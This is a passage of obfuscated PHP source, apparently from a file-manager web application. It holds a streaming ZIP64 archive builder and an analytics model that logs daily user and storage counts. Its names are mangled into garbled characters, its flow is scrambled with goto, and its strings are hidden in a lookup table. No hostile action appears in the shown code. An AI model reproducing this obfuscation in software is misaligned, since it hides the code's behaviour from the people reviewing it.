c‚ıÚÈë·≈: $cÑ≈¨¬ä¨Ê =& $_SERVER[ÁŸäœ¨]; static $dÇè”Öêœì = array(); $B¨àèçŸäª = strtolower($Aœƒäå©÷¬ . $cÑ≈¨¬ä¨Ê[0] . $bŒ”ŸÜ˜ºü); goto E⁄‘ªÇä»‡; Fô∞¡ÑçÔß: $dÇè”Öêœì[$B¨àèçŸäª] = new ModelBase($bŒ”ŸÜ˜ºü, $Aœƒäå©÷¬, $câı£Æƒ•∑); return $dÇè”Öêœì[$B¨àèçŸäª]; goto b≥ŒÔ∏ØüÙ; b≥ŒÔ∏ØüÙ: } goto CÑ§ñÁÙ∂à; BéƒÚÏ¡˘: class ZipMake { const VERSION = "\x30\x2e\x32\x2e\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($eñÈ´†Éùè = null) { $F¶ÇÀ›Ìé∆ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->outputStream = fopen($F¶ÇÀ›Ìé∆[2010], $F¶ÇÀ›Ìé∆[1229]); $this->outputName = $eñÈ´†Éùè; $this->needHeaders = !0; } public function addFile($DˆêÍªﬁﬁÌ, $DΩ’∏èÓ›ë) { goto e˘øÖí®Ñõ; C¨«√Ï¥Öé: while (!feof($b„≈õ¢«ÁÔ)) { $bÜÊÏö∞œ¯ = fread($b„≈õ¢«ÁÔ, 1048576); $this->send($bÜÊÏö∞œ¯); } fclose($b„≈õ¢«ÁÔ); $eÕµµá˘Øü = hexdec(hash_file($fŸê®÷ñáı[2012], $DΩ’∏èÓ›ë)); goto c±Ûî¡Ë¥•; c±Ûî¡Ë¥•: $this->addFileFooter($DˆêÍªﬁﬁÌ, $CÕ≠úÛŒ¬ , $eÕµµá˘Øü, $a´ü¢ëπ ó, $f¥èüø¬√®, $fê˘≥àﬂÖÌ); goto Dü·ÍãœÇ; f©‘ëÏîÒ¢: $fê˘≥àﬂÖÌ = $this->addFileHeader($DˆêÍªﬁﬁÌ, $CÕ≠úÛŒ¬ ); $a´ü¢ëπ ó = $f¥èüø¬√® = filesize($DΩ’∏èÓ›ë); $b„≈õ¢«ÁÔ = fopen($DΩ’∏èÓ›ë, $fŸê®÷ñáı[2011]); goto C¨«√Ï¥Öé; e˘øÖí®Ñõ: $fŸê®÷ñáı =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $DˆêÍªﬁﬁÌ = $this->filterFilename($DˆêÍªﬁﬁÌ); $CÕ≠úÛŒ¬  = static::METHOD_STORE; goto f©‘ëÏîÒ¢; Dü·ÍãœÇ: } public function addFileFromStream($A´áÇë⁄„Ï, $cõ∏†ÓÃîœ) { goto DÖê›°¡∑ô; DÖê›°¡∑ô: $A´áÇë⁄„Ï = $this->filterFilename($A´áÇë⁄„Ï); $C•íûµ≥õÌ = static::METHOD_STORE; $A°ç°èÎ˜¯ = $this->addFileHeader($A´áÇë⁄„Ï, $C•íûµ≥õÌ); goto câä©âü¿ç; câä©âü¿ç: fseek($cõ∏†ÓÃîœ, 0, SEEK_END); $AõÆ◊≈ˆê = $d¿Ó∞Ùàí = ftell($cõ∏†ÓÃîœ); rewind($cõ∏†ÓÃîœ); goto cÎÙÏõ◊Ë¥; cÎÙÏõ◊Ë¥: $DêºÁˆŸóÇ = hash_init($_SERVER[Ä¿¡‡öóµŸﬂ‡][2012]); while (!feof($cõ∏†ÓÃîœ)) { $b‹⁄ü±æ¬ä = fread($cõ∏†ÓÃîœ, 1048576); hash_update($DêºÁˆŸóÇ, $b‹⁄ü±æ¬ä); $this->send($b‹⁄ü±æ¬ä); } $bºäöÚŒºÆ = hexdec(hash_final($DêºÁˆŸóÇ)); goto B»√“ÏœÛù; B»√“ÏœÛù: $this->addFileFooter($A´áÇë⁄„Ï, $C•íûµ≥õÌ, $bºäöÚŒºÆ, $AõÆ◊≈ˆê, $d¿Ó∞Ùàí, $A°ç°èÎ˜¯); goto AÔ™„€µîà; AÔ™„€µîà: } public function finish() { foreach ($this->files as $eàÀè∂ƒÔµ) { $this->addCdrFile($eàÀè∂ƒÔµ); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($eØ»Úﬁíˆ∏, $E¯£Çâ°£∫) { goto BñèÈÁÜΩÊ; cºÀÖè˘Êæ: $bÔâƒ©¢ﬁç = $this->dosTime(time()); $dŒÁ≈î∫Æ≈ = array(array($bê≥Ω≠‚ñó[2014], static::FILE_HEADER_SIGNATURE), array($bê≥Ω≠‚ñó[2015], static::ZIP_VERSION_64), array($bê≥Ω≠‚ñó[2015], 8), array($bê≥Ω≠‚ñó[2015], $E¯£Çâ°£∫), array($bê≥Ω≠‚ñó[2014], $bÔâƒ©¢ﬁç), array($bê≥Ω≠‚ñó[2014], 0), array($bê≥Ω≠‚ñó[2014], 4294967295), array($bê≥Ω≠‚ñó[2014], 4294967295), array($bê≥Ω≠‚ñó[2015], $d›»ëﬁÎÜØ), array($bê≥Ω≠‚ñó[2015], 32)); $F•–œâÉ Ó = array(array($bê≥Ω≠‚ñó[2015], 1), array($bê≥Ω≠‚ñó[2015], 28), array($bê≥Ω≠‚ñó[2016], 0), array($bê≥Ω≠‚ñó[2016], 0), array($bê≥Ω≠‚ñó[2016], 0), array($bê≥Ω≠‚ñó[2014], 0)); goto B…Û‚◊ Âó; B…Û‚◊ Âó: $bé±∑¯±˘œ = $this->packFields($dŒÁ≈î∫Æ≈); $eﬂ¡¶óºÖ‚ = $this->packFields($F•–œâÉ Ó); $this->send($bé±∑¯±˘œ . $eØ»Úﬁíˆ∏ . $eﬂ¡¶óºÖ‚); goto BËúç®⁄Ù´; BËúç®⁄Ù´: return strlen($bé±∑¯±˘œ) + $d›»ëﬁÎÜØ + strlen($eﬂ¡¶óºÖ‚); goto AùÿÕõ÷•È; BñèÈÁÜΩÊ: $bê≥Ω≠‚ñó =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eØ»Úﬁíˆ∏ = preg_replace($bê≥Ω≠‚ñó[2013], $bê≥Ω≠‚ñó[33], $eØ»Úﬁíˆ∏); $d›»ëﬁÎÜØ = strlen($eØ»Úﬁíˆ∏); goto cºÀÖè˘Êæ; AùÿÕõ÷•È: } protected function addFileFooter($dÍøòç®Ïÿ, $bÜ‚‡»ÿ€ƒ, $Dﬂù»√Î—Ï, $CûÇ•úõÿ„, $Cá±ˆâ∞ ≤, $d∆æ±îä¥é) { $EíÂ«Œˆªÿ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $F§¬–§≠Ç≈ = array(array($EíÂ«Œˆªÿ[2014], static::DATA_DESCRIPTOR_SIGNATURE), array($EíÂ«Œˆªÿ[2014], $Dﬂù»√Î—Ï), array($EíÂ«Œˆªÿ[2016], $CûÇ•úõÿ„), array($EíÂ«Œˆªÿ[2016], $Cá±ˆâ∞ ≤)); $d¡ ı€°õÎ = $this->packFields($F§¬–§≠Ç≈); $this->send($d¡ ı€°õÎ); $FÏÒ»ﬂˆæº = $d∆æ±îä¥é + $CûÇ•úõÿ„ + $fÍµÍ–ãˆ’; $this->addToCdr($dÍøòç®Ïÿ, $bÜ‚‡»ÿ€ƒ, $Dﬂù»√Î—Ï, $CûÇ•úõÿ„, $Cá±ˆâ∞ ≤, $FÏÒ»ﬂˆæº); } private function addToCdr($BµÊü∫˜˘, $D‚∞åæ‰˘, $E”™·Âó”“, $dÒœà£Ü¡œ, $dÊ»˘÷πØ¬, $cå∏•µˆç…) { $this->files[] = array($BµÊü∫˜˘, $D‚∞åæ‰˘, $E”™·Âó”“, $dÒœà£Ü¡œ, $dÊ»˘÷πØ¬, $this->ofs); $this->ofs += $cå∏•µˆç…; } protected function addCdrFile($F†»Ùößµ‚) { goto cçë‘¡Ï∆∂; AÏ§ñú≤Éø: $this->send($Dê◊Â√–ÒÉ); $this->cdr_ofs += strlen($Dê◊Â√–ÒÉ); goto A©Õıéãá⁄; cçë‘¡Ï∆∂: $a≤ïî™∫À¢ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; list($DÙ„≠Û˘ıÇ, $f‹Ë∂ÚﬂÕñ, $Fì‘éâ©ÿò, $BäÜõ´…öå, $eÒËÎŸâÑ‡, $FÖÕπﬂ«¢å) = $F†»Ùößµ‚; $Bé´ôŸ“áö = $a≤ïî™∫À¢[33]; goto FÊ¿ˆ‹Ö‰Î; FÊ¿ˆ‹Ö‰Î: $f–Áßâ¬∫‘ = $this->dosTime(time()); $EÿË ñ´˜ = array(array($a≤ïî™∫À¢[2014], static::CDR_FILE_SIGNATURE), array($a≤ïî™∫À¢[2015], static::ZIP_VERSION_64), array($a≤ïî™∫À¢[2015], static::ZIP_VERSION_64), array($a≤ïî™∫À¢[2015], 8), array($a≤ïî™∫À¢[2015], $f‹Ë∂ÚﬂÕñ), array($a≤ïî™∫À¢[2014], $f–Áßâ¬∫‘), array($a≤ïî™∫À¢[2014], $Fì‘éâ©ÿò), array($a≤ïî™∫À¢[2014], 4294967295), array($a≤ïî™∫À¢[2014], 4294967295), array($a≤ïî™∫À¢[2015], strlen($DÙ„≠Û˘ıÇ)), array($a≤ïî™∫À¢[2015], 32), array($a≤ïî™∫À¢[2015], strlen($Bé´ôŸ“áö)), array($a≤ïî™∫À¢[2015], 0), array($a≤ïî™∫À¢[2015], 0), array($a≤ïî™∫À¢[2014], 32), array($a≤ïî™∫À¢[2014], 4294967295)); $e¬ˆå¯∑¡â = array(array($a≤ïî™∫À¢[2015], 1), array($a≤ïî™∫À¢[2015], 28), array($a≤ïî™∫À¢[2016], $eÒËÎŸâÑ‡), array($a≤ïî™∫À¢[2016], $BäÜõ´…öå), array($a≤ïî™∫À¢[2016], $FÖÕπﬂ«¢å), array($a≤ïî™∫À¢[2014], 0)); goto f¬◊ƒƒâ•ß; f¬◊ƒƒâ•ß: $aé§¢™ïı‚ = $this->packFields($EÿË ñ´˜); $c»Ò∫åâ¿´ = $this->packFields($e¬ˆå¯∑¡â); $Dê◊Â√–ÒÉ = $aé§¢™ïı‚ . $DÙ„≠Û˘ıÇ . $Bé´ôŸ“áö . $c»Ò∫åâ¿´; goto AÏ§ñú≤Éø; A©Õıéãá⁄: } protected function addCdr64Eof() { goto BÚÔ’ò‹á◊; BÚÔ’ò‹á◊: $eÎ¨”£∞ø√ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dõŸ•∏œ‡« = count($this->files); $a÷º∂á¬ÙÚ = $this->cdr_ofs; goto dá¢¶ƒÕÑú; dá¢¶ƒÕÑú: $bÕ≥√«ä¨ë = $this->ofs; $cå‘∞◊ë±é = array(array($eÎ¨”£∞ø√[2014], static::ZIP64_CDR_EOF_SIGNATURE), array($eÎ¨”£∞ø√[2016], 44), array($eÎ¨”£∞ø√[2015], static::ZIP_VERSION_64), array($eÎ¨”£∞ø√[2015], static::ZIP_VERSION_64), array($eÎ¨”£∞ø√[2014], 0), array($eÎ¨”£∞ø√[2014], 0), array($eÎ¨”£∞ø√[2016], $dõŸ•∏œ‡«), array($eÎ¨”£∞ø√[2016], $dõŸ•∏œ‡«), array($eÎ¨”£∞ø√[2016], $a÷º∂á¬ÙÚ), array($eÎ¨”£∞ø√[2016], $bÕ≥√«ä¨ë)); $b ≠∑’•ìî = $this->packFields($cå‘∞◊ë±é); goto a›ç±äì“–; a›ç±äì“–: $this->send($b ≠∑’•ìî); goto BïÊ¬∏äÎ›; BïÊ¬∏äÎ›: } protected function addCdr64Locator() { goto dçºîÇπ”å; cª´ÖõÖ∆÷: $this->send($eﬂºèïû«°); goto Aäø∞Â®‰û; dçºîÇπ”å: $E°ÛÙÆé®à =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $f·êåØëÇÖ = count($this->files); $A®ﬁ÷⁄´Àç = $this->cdr_ofs; goto eË∂Òâ¬ê∫; eË∂Òâ¬ê∫: $Aöº◊¬Í∫ﬁ = $this->ofs; $Cı∆Ú´∑€ò = array(array($E°ÛÙÆé®à[2014], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($E°ÛÙÆé®à[2014], 0), array($E°ÛÙÆé®à[2016], $Aöº◊¬Í∫ﬁ + $A®ﬁ÷⁄´Àç), array($E°ÛÙÆé®à[2014], 1)); $eﬂºèïû«° = $this->packFields($Cı∆Ú´∑€ò); goto cª´ÖõÖ∆÷; Aäø∞Â®‰û: } protected function addCdrEof() { goto E∑¨ŒÁ˘å; E∑¨ŒÁ˘å: $AÌÀÈ·ëâ˜ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $EåÓ”ÒÚâ” = count($this->files); $CßîË¡‰êñ = $this->cdr_ofs; goto Aö≥Áπ‰òö; Aö≥Áπ‰òö: $BßÎìÊº®± = $this->ofs; $AªÕŸ§§ ª = $AÌÀÈ·ëâ˜[33]; $aøÆ€ïÿΩ⁄ = array(array($AÌÀÈ·ëâ˜[2014], static::CDR_EOF_SIGNATURE), array($AÌÀÈ·ëâ˜[2015], 0), array($AÌÀÈ·ëâ˜[2015], 0), array($AÌÀÈ·ëâ˜[2015], $EåÓ”ÒÚâ”), array($AÌÀÈ·ëâ˜[2015], $EåÓ”ÒÚâ”), array($AÌÀÈ·ëâ˜[2014], 4294967295), array($AÌÀÈ·ëâ˜[2014], 4294967295), array($AÌÀÈ·ëâ˜[2015], strlen($AªÕŸ§§ ª))); goto D≈øâúÀ„Ú; D≈øâúÀ„Ú: $Bñï ±ë‡ó = $this->packFields($aøÆ€ïÿΩ⁄) . $AªÕŸ§§ ª; $this->send($Bñï ±ë‡ó); goto aô≠ÔÒ¯¯œ; aô≠ÔÒ¯¯œ: } protected function addCdr() { foreach ($this->files as $a«±≤ÑâÉ°) { $this->addCdrFile($a«±≤ÑâÉ°); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $CÚ‹ˆü ô© =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Bõ≤ì≤•±° = $CÚ‹ˆü ô©[202]; if ($this->outputName) { $b‘ßààê€Ê = trim(str_replace(array($CÚ‹ˆü ô©[113], $CÚ‹ˆü ô©[55], $CÚ‹ˆü ô©[93], $CÚ‹ˆü ô©[67], $CÚ‹ˆü ô©[217], $CÚ‹ˆü ô©[996]), $CÚ‹ˆü ô©[33], $this->outputName)); $F©”•ÊÀŸÉ = rawurlencode($b‘ßààê€Ê); $Bõ≤ì≤•±° .= "\x3b\x20\x66\x69\x6c\145\x6e\x61\x6d\x65\x2a\75\165\x74\146\55\70\47\x27{$F©”•ÊÀŸÉ}"; } $cºˆÂñÉÁ≈ = array($CÚ‹ˆü ô©[199] => $CÚ‹ˆü ô©[2017], $CÚ‹ˆü ô©[2018] => $Bõ≤ì≤•±°, $CÚ‹ˆü ô©[2019] => $CÚ‹ˆü ô©[2020], $CÚ‹ˆü ô©[2021] => $CÚ‹ˆü ô©[2022], $CÚ‹ˆü ô©[2023] => $CÚ‹ˆü ô©[2024]); foreach ($cºˆÂñÉÁ≈ as $DÛ‡É÷‰Éà => $BΩåàÙÑ¥ß) { header($DÛ‡É÷‰Éà . $CÚ‹ˆü ô©[884] . $BΩåàÙÑ¥ß); } } protected function send($E¨Òâç˜›´) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $E¨Òâç˜›´); } protected final function dosTime($Cü∞Ì¢ïÌß) { $bù€ê⁄€§ç =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $aò…óŒ÷µÆ = getdate($Cü∞Ì¢ïÌß); if ($aò…óŒ÷µÆ[$bù€ê⁄€§ç[1727]] < 1980) { $aò…óŒ÷µÆ = array($bù€ê⁄€§ç[1727] => 1980, $bù€ê⁄€§ç[2025] => 1, $bù€ê⁄€§ç[2026] => 1, $bù€ê⁄€§ç[2027] => 0, $bù€ê⁄€§ç[2028] => 0, $bù€ê⁄€§ç[2029] => 0); } $aò…óŒ÷µÆ[$bù€ê⁄€§ç[1727]] -= 1980; return $aò…óŒ÷µÆ[$bù€ê⁄€§ç[1727]] << 25 | $aò…óŒ÷µÆ[$bù€ê⁄€§ç[2025]] << 21 | $aò…óŒ÷µÆ[$bù€ê⁄€§ç[2026]] << 16 | $aò…óŒ÷µÆ[$bù€ê⁄€§ç[2027]] << 11 | $aò…óŒ÷µÆ[$bù€ê⁄€§ç[2028]] << 5 | $aò…óŒ÷µÆ[$bù€ê⁄€§ç[2029]] >> 1; } protected function packFields($Dê¶øïØ®ç) { $D—†ƒ—–à≠ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dŒôÏâÓÙÌ = $D—†ƒ—–à≠[33]; $añıä˜Ú≥ = array(); foreach ($Dê¶øïØ®ç as $A±¿ó¨£Í–) { $dŒôÏâÓÙÌ .= $A±¿ó¨£Í–[0]; $añıä˜Ú≥[] = $A±¿ó¨£Í–[1]; } array_unshift($añıä˜Ú≥, $dŒôÏâÓÙÌ); return call_user_func_array($D—†ƒ—–à≠[2030], $añıä˜Ú≥); } protected function filterFilename($e£≈àŒõØ‡) { $D‚∞ñ€±°ã =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; return str_replace(array($D‚∞ñ€±°ã[93], $D‚∞ñ€±°ã[4], $D‚∞ñ€±°ã[176], $D‚∞ñ€±°ã[69], $D‚∞ñ€±°ã[113], $D‚∞ñ€±°ã[929], $D‚∞ñ€±°ã[932], $D‚∞ñ€±°ã[271]), $D‚∞ñ€±°ã[70], $e£≈àŒõØ‡); } } class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($aƒîàîÂª£) { $CÀÚ≤Óîä =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $CœèŒœ°˘ı = array($CÀÚ≤Óîä[535] => array($CÀÚ≤Óîä[29] => $CÀÚ≤Óîä[2031], $CÀÚ≤Óîä[261] => array($CÀÚ≤Óîä[210], $CÀÚ≤Óîä[700], $CÀÚ≤Óîä[2032], $CÀÚ≤Óîä[2033])), $CÀÚ≤Óîä[2034] => array($CÀÚ≤Óîä[29] => $CÀÚ≤Óîä[2035], $CÀÚ≤Óîä[261] => array($CÀÚ≤Óîä[210], $CÀÚ≤Óîä[698], $CÀÚ≤Óîä[2036], $CÀÚ≤Óîä[2037], $CÀÚ≤Óîä[2038]))); if (!isset($CœèŒœ°˘ı[$aƒîàîÂª£])) { return !1; } $this->optionType = $CœèŒœ°˘ı[$aƒîàîÂª£][$CÀÚ≤Óîä[29]]; $this->field = $CœèŒœ°˘ı[$aƒîàîÂª£][$CÀÚ≤Óîä[261]]; return !0; } public function listData($côø›¬öÜ≠ = false, $E«∫ìá—¥ë = "\155\x6f\144\151\146\171\124\151\x6d\x65", $f•∂Øé±Ã› = false) { return parent::listData($côø›¬öÜ≠, $E«∫ìá—¥ë, $f•∂Øé±Ã›); } public function trendList($bîƒˆÓ∏“) { goto E≥¬Ñ√¡≈ı; Bëˆò∑©êØ: foreach ($fä‰—Ò•¥⁄ as $eöª•∂üˆ•) { $this->{$D–ÃÀ∞Ø∏û}($eöª•∂üˆ•); } return $this->listData(); goto F¿ÙØáÚ ∏; D©ı‘Ú∑¯∫: if (!isset($dáöàÀœêÏ)) { $dÊºûÊ¡∫œ = $bîƒˆÓ∏“ == $b„Óã”™Ÿ[535] ? $b„Óã”™Ÿ[477] : $b„Óã”™Ÿ[761]; $dáöàÀœêÏ = Model($dÊºûÊ¡∫œ)->min($b„Óã”™Ÿ[187]); } $D–ÃÀ∞Ø∏û = $b„Óã”™Ÿ[2041] . ucfirst($bîƒˆÓ∏“); $fä‰—Ò•¥⁄ = $this->dateList($dáöàÀœêÏ); goto Bëˆò∑©êØ; E≥¬Ñ√¡≈ı: $b„Óã”™Ÿ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Dú‘⁄≥±ëÇ = $this->listData(); if ($Dú‘⁄≥±ëÇ) { $A≠ãìûñæÎ = end($Dú‘⁄≥±ëÇ); $eöª•∂üˆ• = date($b„Óã”™Ÿ[2039], strtotime($b„Óã”™Ÿ[2040])); if ($A≠ãìûñæÎ[$b„Óã”™Ÿ[210]] == $eöª•∂üˆ•) { return $Dú‘⁄≥±ëÇ; } $dáöàÀœêÏ = strtotime($A≠ãìûñæÎ[$b„Óã”™Ÿ[210]]); } goto D©ı‘Ú∑¯∫; F¿ÙØáÚ ∏: } private function dateList($f‰Î⁄÷Ø◊Í) { $c›∂ë«Ü∏¡ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c≤é„ë˘èÊ = $f‰Î⁄÷Ø◊Í; $FÒŸÍ†˘ê« = strtotime($c›∂ë«Ü∏¡[2040]); $a≥âŸÊËØà = array(); while ($c≤é„ë˘èÊ <= $FÒŸÍ†˘ê«) { $a≥âŸÊËØà[] = date($c›∂ë«Ü∏¡[2039], $c≤é„ë˘èÊ); $c≤é„ë˘èÊ = strtotime($c›∂ë«Ü∏¡[2042], $c≤é„ë˘èÊ); } return $a≥âŸÊËØà; } public function _recordUser($Dç≈»ÀßÀÌ = '') { goto AçÍÏ∆ïÎ; føÓΩç§ÁØ: $Fô“⁄Õµ“ã = array($C‡â≥êÔ£È[187] => array($C‡â≥êÔ£È[931], $f¢íﬁπß«…)); $A—Œâ¶πÖº = Model($C‡â≥êÔ£È[477])->where($Fô“⁄Õµ“ã)->count($C‡â≥êÔ£È[1438]); $Fô“⁄Õµ“ã[$C‡â≥êÔ£È[187]] = array($C‡â≥êÔ£È[321], array($f˜Î¶ÉÍ∏Ã, $f¢íﬁπß«…)); goto cœÑí·˘µ‘; cœÑí·˘µ‘: $Dﬁ˘∞‡è·ö = Model($C‡â≥êÔ£È[477])->where($Fô“⁄Õµ“ã)->count($C‡â≥êÔ£È[1438]); $Fô“⁄Õµ“ã[$C‡â≥êÔ£È[29]] = $C‡â≥êÔ£È[2045]; $B†€Á¥¿¥∆ = Model($C‡â≥êÔ£È[2046])->where($Fô“⁄Õµ“ã)->count($C‡â≥êÔ£È[2047]); goto dãøÎá∑â≠; AçÍÏ∆ïÎ: $C‡â≥êÔ£È =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $f˜Î¶ÉÍ∏Ã = strtotime(date($C‡â≥êÔ£È[2043], strtotime($Dç≈»ÀßÀÌ))); $f¢íﬁπß«… = strtotime(date($C‡â≥êÔ£È[2044], strtotime($Dç≈»ÀßÀÌ))); goto føÓΩç§ÁØ; dãøÎá∑â≠: $a—™Ó¶èÂÕ = array($C‡â≥êÔ£È[210] => $Dç≈»ÀßÀÌ, $C‡â≥êÔ£È[700] => (int) $A—Œâ¶πÖº, $C‡â≥êÔ£È[2032] => (int) $Dﬁ˘∞‡è·ö, $C‡â≥êÔ£È[2033] => (int) $B†€Á¥¿¥∆); return $this->insert($a—™Ó¶èÂÕ); goto aäœ¢·«ù›; aäœ¢·«ù›: } public function _recordStore($aà◊èèÒÑØ = '') { goto e∂Ù˜ÿæ“∆; e∂Ù˜ÿæ“∆: $fˆŸ”±üÛß =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eâ¯ß∏Ûïá = strtotime(date($fˆŸ”±üÛß[2044], strtotime($aà◊èèÒÑØ))); $A®Ç¡Œè◊¨ = array($fˆŸ”±üÛß[187] => array($fˆŸ”±üÛß[931], $eâ¯ß∏Ûïá)); goto AéØÉŸÃØ˜; BˆÉ¡—Ãç∞: $A®Ç¡Œè◊¨[$fˆŸ”±üÛß[371]] = 1; $EÖû“ßﬁ∫ã = Model($fˆŸ”±üÛß[761])->where($A®Ç¡Œè◊¨)->sum($fˆŸ”±üÛß[77]); $A®Ç¡Œè◊¨[$fˆŸ”±üÛß[371]] = 2; goto bˆèÚ™®¶é; AéØÉŸÃØ˜: $eª£›∂éÂô = Model($fˆŸ”±üÛß[422])->where($A®Ç¡Œè◊¨)->sum($fˆŸ”±üÛß[77]); $A®Ç¡Œè◊¨[$fˆŸ”±üÛß[370]] = 0; $A“ëã‹ÂØŸ = Model($fˆŸ”±üÛß[761])->where($A®Ç¡Œè◊¨)->sum($fˆŸ”±üÛß[77]); goto BˆÉ¡—Ãç∞; bˆèÚ™®¶é: $b§∆ÇÀØ–¥ = Model($fˆŸ”±üÛß[761])->where($A®Ç¡Œè◊¨)->sum($fˆŸ”±üÛß[77]); $a´– «Ï„ç = array($fˆŸ”±üÛß[210] => $aà◊èèÒÑØ, $fˆŸ”±üÛß[698] => (int) $A“ëã‹ÂØŸ, $fˆŸ”±üÛß[2036] => (int) $eª£›∂éÂô, $fˆŸ”±üÛß[2037] => (int) $EÖû“ßﬁ∫ã, $fˆŸ”±üÛß[2038] => (int) $b§∆ÇÀØ–¥); return $this->insert($a´– «Ï„ç); goto aªàé¢‰∑¶; aªàé¢‰∑¶: } public function trend($eÀñÌ‡åﬂÁ, $DÈô¶é¥≠ÿ) { goto dÉ⁄ô£≈âÒ; bÉÂûåéõ∂: if ($Cî€¶’û£› && $DÈô¶é¥≠ÿ != $cÓ…∂”é∏Ô[1413]) { $a§®Éó∞Ω† = $Cî€¶’û£›[0][$cÓ…∂”é∏Ô[210]]; $Cà¢°ãÓ¬ä = $this->validDate($DÈô¶é¥≠ÿ, $a§®Éó∞Ω†); $BΩµæÓ¶∏ä = array(); $Cé±Ì¯ﬁ©⁄ = array_to_keyvalue($Cî€¶’û£›, $cÓ…∂”é∏Ô[210]); foreach ($Cà¢°ãÓ¬ä as $BÜ˘≤ôú§›) { if (isset($Cé±Ì¯ﬁ©⁄[$BÜ˘≤ôú§›])) { $AªÇ·∆ùØ€ = $Cé±Ì¯ﬁ©⁄[$BÜ˘≤ôú§›]; } else { $AªÇ·∆ùØ€ = end($Cî€¶’û£›); $AªÇ·∆ùØ€[$cÓ…∂”é∏Ô[210]] = $BÜ˘≤ôú§›; if ($eÀñÌ‡åﬂÁ == $cÓ…∂”é∏Ô[535]) { $AªÇ·∆ùØ€[$cÓ…∂”é∏Ô[2032]] = $AªÇ·∆ùØ€[$cÓ…∂”é∏Ô[2033]] = 0; } } $BΩµæÓ¶∏ä[] = $AªÇ·∆ùØ€; } $Cî€¶’û£› = $BΩµæÓ¶∏ä; } $a„√ÃÂµöô = array($cÓ…∂”é∏Ô[535] => array($cÓ…∂”é∏Ô[700] => LNG($cÓ…∂”é∏Ô[2048]), $cÓ…∂”é∏Ô[2032] => LNG($cÓ…∂”é∏Ô[2049]), $cÓ…∂”é∏Ô[2033] => LNG($cÓ…∂”é∏Ô[2050])), $cÓ…∂”é∏Ô[2034] => array($cÓ…∂”é∏Ô[698] => LNG($cÓ…∂”é∏Ô[2051]), $cÓ…∂”é∏Ô[2036] => LNG($cÓ…∂”é∏Ô[2052]), $cÓ…∂”é∏Ô[2037] => LNG($cÓ…∂”é∏Ô[2053]), $cÓ…∂”é∏Ô[2038] => LNG($cÓ…∂”é∏Ô[2054]))); $DÖÂºáæ≈π = array($cÓ…∂”é∏Ô[535] => $cÓ…∂”é∏Ô[2055], $cÓ…∂”é∏Ô[2034] => $cÓ…∂”é∏Ô[77]); goto eÜÛŸû®‚†; dÉ⁄ô£≈âÒ: $cÓ…∂”é∏Ô =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$this->init($eÀñÌ‡åﬂÁ)) { return !1; } $Cî€¶’û£› = $this->trendList($eÀñÌ‡åﬂÁ); goto bÉÂûåéõ∂; eÜÛŸû®‚†: if (empty($Cî€¶’û£›)) { $BÜ˘≤ôú§› = date($cÓ…∂”é∏Ô[2039], strtotime($cÓ…∂”é∏Ô[2040])); $D∆ˆÓ◊≠ÇÔ = array($cÓ…∂”é∏Ô[210] => $BÜ˘≤ôú§›); foreach ($a„√ÃÂµöô[$eÀñÌ‡åﬂÁ] as $b……˜óèóÃ => $B˜éèÊÀ∂ç) { $D∆ˆÓ◊≠ÇÔ[$b……˜óèóÃ] = 0; } $Cî€¶’û£›[] = $D∆ˆÓ◊≠ÇÔ; } $CÇïΩô√éß = array(); foreach ($Cî€¶’û£› as $B˜éèÊÀ∂ç) { if ($eÀñÌ‡åﬂÁ == $cÓ…∂”é∏Ô[2034] && $B˜éèÊÀ∂ç[$cÓ…∂”é∏Ô[2036]] > $B˜éèÊÀ∂ç[$cÓ…∂”é∏Ô[698]]) { $B˜éèÊÀ∂ç[$cÓ…∂”é∏Ô[2036]] = $B˜éèÊÀ∂ç[$cÓ…∂”é∏Ô[698]]; } foreach ($a„√ÃÂµöô[$eÀñÌ‡åﬂÁ] as $b……˜óèóÃ => $Cıà⁄ÖçÏ∫) { $AªÇ·∆ùØ€ = array($cÓ…∂”é∏Ô[210] => $B˜éèÊÀ∂ç[$cÓ…∂”é∏Ô[210]], $cÓ…∂”é∏Ô[1344] => $Cıà⁄ÖçÏ∫); $AªÇ·∆ùØ€[$DÖÂºáæ≈π[$eÀñÌ‡åﬂÁ]] = isset($B˜éèÊÀ∂ç[$b……˜óèóÃ]) ? $B˜éèÊÀ∂ç[$b……˜óèóÃ] : 0; $CÇïΩô√éß[] = $AªÇ·∆ùØ€; } } goto EÇ¥¿åøËì; EÇ¥¿åøËì: return $CÇïΩô√éß; goto AßÓÖãƒ“å; AßÓÖãƒ“å: } public function validDate($BáÙªÍÂ∆ı, $aó£◊éö§Ò) { goto C∫¿ﬂ∂ªÎﬁ; C∫¿ﬂ∂ªÎﬁ: $FÀ∫ìÑî·Í =& 